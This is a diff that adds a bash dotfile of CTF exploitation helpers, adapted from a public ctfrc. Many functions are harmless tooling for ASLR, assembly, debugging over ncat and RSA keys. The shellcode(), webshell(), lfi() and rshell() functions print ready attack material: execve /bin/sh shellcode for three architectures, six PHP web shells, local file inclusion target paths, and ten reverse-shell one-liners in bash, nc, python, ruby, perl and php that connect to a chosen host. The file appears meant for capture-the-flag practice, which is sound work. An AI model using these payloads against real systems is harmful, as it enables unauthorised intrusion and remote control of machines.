@@ -1,0 +1,304 @@
+#!/bin/bash
+# modify from https://github.com/L4ys/dotfiles/blob/master/ctfrc
+# Lazy functions for ctf
+
+alias rop="ROPgadget --binary"
+alias asm32="as -msyntax=intel --32 -mnaked-reg -aln -o /dev/null"
+alias asm64="as -msyntax=intel --64 -mnaked-reg -aln -o /dev/null"
+alias asm-arm="arm-linux-gnueabi-as -aln -o /dev/null"
+alias asm-a64="aarch64-linux-gnu-as -aln -o /dev/null"
+alias lddd="LD_TRACE_LOADED_OBJECTS=1"
+
+checksec()
+{
+    checksec_file="$HOME/CTF-master/script/checksec.sh"
+    if [ ! -f "$checksec_file" ]; then
+        echo "Can't find checksec.sh"
+    else
+        if [ -z $1 ]; then
+            echo "Usage: checksec <filename>"
+        else
+            $checksec_file --file $1
+        fi
+    fi
+}
+
+aslr()
+{
+    if [ -z $1 ]; then
+        cat /proc/sys/kernel/randomize_va_space
+    elif [ $1 = "on" ]; then
+        sudo sysctl -w kernel.randomize_va_space=2
+    elif [ $1 = "off" ]; then
+        sudo sysctl -w kernel.randomize_va_space=0
+    fi
+}
+
+syscall()
+{
+    grep --color -m 1 "$1" /usr/include/asm/unistd.h /usr/include/asm/unistd_32.h /usr/include/asm/unistd_64.h 2>/dev/null
+}
+
+libc()
+{
+    libc_system=$(readelf -s "$1" | grep " system@" | awk '{print $2}')
+    libc_sh=$(strings -tx "$1" | grep "/bin/sh" | awk '{print $1}')
+    echo "libc_system = libc_base + 0x$libc_system"
+    echo "libc_sh = libc_base + 0x$libc_sh"
+}
+
+asm2elf()
+{
+    local OUTPUT=${2:-"elf.out"}
+    local OBJ=$1_$(date +%s).o
+    nasm -f elf $1 -o $OBJ && ld $OBJ -m elf_i386 -o $OUTPUT 
+    rm -f $OBJ 2>&1 > /dev/null
+}
+
+asm2elf64()
+{
+    local OUTPUT=${2:-"elf.out"}
+    local OBJ=$1_$(date +%s).o
+    nasm -f elf64 $1 -o $OBJ && ld $OBJ -m elf_x86_64 -o $OUTPUT
+    rm -f $OBJ 2>&1 > /dev/null
+}
+
+pxxd()
+{
+    if [ -z "$1" ]; then
+        xxd -p | awk -F '' '{ for(i=1; i<=NF; i+=2) {printf "\x%s%s", $i,$(i+1);}; printf "\n" }'
+    else
+        xxd -p "$1" | awk -F '' '{ for(i=1; i<=NF; i+=2) {printf "\x%s%s", $i,$(i+1);}; printf "\n" }'
+    fi
+}
+
+maps()
+{
+    if [ -z "$1" ]; then
+        echo "Usage: $FUNCNAME <proc name>"
+    else
+        cat /proc/$(pgrep -n $1)/maps
+    fi
+}
+
+ncat-local()
+{
+    if [ -z "$1" ]; then
+        echo "Usage: $FUNCNAME <command>"
+    else
+        local PORT=${2:-4000}
+        ncat -vc "$*" -kl localhost $PORT
+    fi
+}
+
+ncat-strace()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        ncat -vc "strace -ixv -s 100 $*" -kl localhost 4000 
+    fi
+}
+
+ncat-ltrace()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        ncat -vc "ltrace -iC $*" -kl localhost 4000 
+    fi
+}
+
+ncat-pin()
+{
+    if [ ! -f $1 ]; then
+        echo "PinTool '$1' not found!"
+    elif [ ! -f ${@: -1} ]; then
+        echo "File '${@: -1}' not found!"
+    else
+        ncat -kl localhost 4000 -vc "pin -t '${@:1:$#-1}' -- ${@: -1}" 
+    fi
+}
+
+ncat-gdb()
+{
+    if [ ! -f ${@: -1} ]; then
+        echo "${@: -1} not found!"
+    else
+        echo ${@: -1} listen on port 4000, gdbserver listen on port 4444
+        echo run \'gdb ${@: -1}\' then target remote localhost:4444 in gdb
+        echo 
+
+        ncat -vc "gdbserver localhost:4444 $*" -kl localhost 4000 
+    fi
+}
+
+fuckalarm()
+{
+    if [ -z $1 ]; then
+        echo "Usage: $FUNCNAME <File>"
+    elif [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        sed s/alarm/isnan/g "$1" > $1"_noalarm"
+        chmod +x $1"_noalarm"
+    fi
+}
+
+fucksleep()
+{
+    if [ -z $1 ]; then
+        echo "Usage: $FUNCNAME <File>"
+    elif [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        sed s/sleep/isnan/g "$1" > $1"_nosleep"
+        chmod +x $1"_nosleep"
+    fi
+}
+
+fuckptrace()
+{
+    if [ -z $1 ]; then
+        echo "usage: $FUNCNAME <File>"
+    elif [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        sed s/ptrace/isnanl/g "$1" > $1"_noptrace"
+        chmod +x $1"_noptrace"
+    fi
+}
+
+quote()
+{
+    python -c "print __import__('urllib').quote('$1')"
+}
+
+unquote()
+{
+    python -c "print __import__('urllib').unquote('$1')"
+}
+
+shellcode()
+{
+    echo "# Linux/x86 execve /bin/sh shellcode 21 bytes"
+    echo "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
+
+    echo "# Linux/x64 execve /bin/sh shellcode 27 bytes"
+    echo "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+    echo "# Linux/ARM execve("/bin/sh", [0], [0 vars]) - 27 bytes"
+    echo "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+}
+
+webshell()
+{
+    echo "<?php @eval(\$_POST[c]);?>"
+    echo "<?php \$_GET[a](\$_GET[b]);?>"
+    echo "<?php @passthru(\$_POST[1])?>"
+    echo "<?php @extract(\$_REQUEST); @die( \$ctime(\$atime) ); ?>"
+    echo "<?php @include 'php://input'; ?>"
+    echo "<?php (\$_=@\$_GET[2]).@\$_(\$_POST[1]) ?>"
+}
+
+lfi()
+{
+   echo "php://input"
+   echo "php://filter/convert.base64-encode/resource="
+   echo "/proc/self/environ"
+   echo "/proc/self/cmdline"
+   echo "/proc/self/fd/x"
+   echo "/tmp/sess_"
+   echo "/var/lib/php5/sess_"
+   echo "/var/log/apache2/access.log"
+   echo "/var/log/apache2/access_log"
+   echo "/var/log/apache2/error.log"
+   echo "/var/log/apache2/error_log"
+   echo "/etc/httpd/logs/acces_log"
+   echo "/etc/httpd/logs/acces.log"
+   echo "/etc/httpd/logs/error_log"
+   echo "/etc/httpd/logs/error.log"
+   echo "/var/www/logs/access_log"
+   echo "/var/www/logs/access.log"
+   echo "/var/www/logs/error_log"
+   echo "/var/www/logs/error.log"
+   echo "/var/log/error_log"
+   echo "/var/log/error.log"
+   echo "/var/log/auth.log"
+   echo "Apache defaut path: http://wiki.apache.org/httpd/DistrosDefaultLayout"
+}
+
+rshell()
+{
+    IP=${1:-"[IP]"}
+    PORT=${2:-"[PORT]"}
+
+    echo "sh <&4 >&4"
+    echo "bash -i > /dev/tcp/$IP/$PORT  0<&1  2>&1"
+    echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+    echo "nc -e /bin/sh $IP $PORT"
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
+    echo "script -qc 'bash -i' /dev/null &>/dev/tcp/$IP/$PORT <&1"
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    echo "ruby -rsocket -e'f=TCPSocket.open("$IP",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    echo "perl -e \"use Socket;\$i='$IP';\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};' }\""
+    echo "php -r \"\$sock=fsockopen('$IP',$PORT);exec('/bin/sh -i <&3 >&3 2>&3');\""
+}
+
+rsa-public()
+{
+    if [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        openssl rsa -noout -text -pubin -in $1 | tr -d \\n | sed 's/Modulus /Public Key /;s/Modulus:/:/;s/):/)\nN=/;s/Exponent/\ne=/;s/ //g;s/://g'; echo
+    fi
+}
+
+rsa-private()
+{
+    if [ ! -f $1 ]; then
+        echo "$1 not found!"
+    else
+        openssl rsa -noout -text -in $1 | tr -d \\n | sed 's/)modulus:/)\nN=/;s/privateExponent:/\nd=/;s/publicExponent:/\n\ne=/;s/prime1/\n\np=/;s/prime2/\n\nq=/;s/exponent.*/\n/g;s/ //g;s/://g';
+    fi
+}
+
+rsa-expublic()
+{
+    if [ $# -gt 2 -o $# -lt 1 ]; then
+        echo "Usage: $FUNCNAME <private key> <output pem>"
+    elif [ ! -f "$1" ]; then
+        echo "Private key: $1 not found!"
+    else
+        local PEM=${2:-"public.pem"}
+        openssl rsa -in $1 -pubout -out $PEM
+    fi
+}
+
+rsa-enc()
+{
+    if [ $# -gt 3 -o $# -lt 2 ]; then
+        echo "Usage: $FUNCNAME <public key> <input file> <output file>"
+    elif [ ! -f "$1" ]; then
+        echo "Public key: $1 not found!"
+    elif [ ! -f "$2" ]; then
+        echo "Input file: $2 not found!"
+    else
+        local OUTPUT=${3:-"$2.enc"}
+        openssl rsautl -encrypt -pubin -inkey $1 -in $2 -out $OUTPUT
+    fi
+}
+
+rsa-dec()
+{
+    if [ $# -gt 3 -o $# -lt 2 ]; then
+        echo "Usage: $FUNCNAME <private key> <input file> <output file>"
+    elif [ ! -f "$1" ]; then
+        echo "Private key: $1 not found!"
+    elif [ ! -f "$2" ]; then
+        echo "Input file: $2 not found!"
+    else
+        local OUTPUT=${3:-"$2.dec"}
+        openssl rsautl -decrypt -inkey $1 -in $2 -out $OUTPUT
+    fi
+}
